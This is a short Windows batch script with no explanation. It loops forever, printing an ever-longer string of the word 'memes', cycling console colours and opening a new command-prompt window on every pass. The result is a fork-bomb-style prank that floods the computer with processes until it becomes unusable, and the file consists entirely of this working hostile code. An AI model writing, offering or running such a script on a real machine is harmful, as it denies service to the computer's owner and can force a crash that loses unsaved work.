@echo off 
:b 
SET m=%m%memes 
SET /A c=c+1 
IF [%c%]==[10] SET /A c=0 
COLOR 0%c% 
echo %m%
start /I cmd.exe /T:0%c% /K call b 
goto:b
